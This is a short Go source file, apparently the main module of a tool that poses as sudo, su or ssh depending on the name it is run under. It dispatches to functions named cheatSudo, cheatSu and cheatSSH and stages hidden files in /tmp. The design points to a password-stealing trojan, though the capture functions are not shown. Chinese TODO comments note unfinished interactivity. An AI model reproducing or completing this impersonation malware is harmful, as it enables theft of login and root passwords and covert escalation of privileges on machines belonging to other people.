package main

import (
	uuid "github.com/satori/go.uuid"
	"os"
	"path"
	"strings"
)

const tempPath = "/tmp"

//TODO 添加全局变量来设置选项
//TODO delete debug
//const tempPath = "./"

var filename = path.Join(tempPath, ".1.swap")
var _, program = path.Split(os.Args[0])
var scriptName = path.Join(tempPath, "."+uuid.NewV4().String())

var fd = int(os.Stdin.Fd())
var cmd = program + " " + strings.Join(os.Args[1:], " ")

func main() {
	if program == "sudo" {
		cheatSudo()
	}
	//TODO 未经测试，切换用户后tab无法自动补全，无法交互，ps字符会被退格键删除
	if program == "su" {
		cheatSu()
	}
	if program == "ssh" {
		cheatSSH()
	}
}
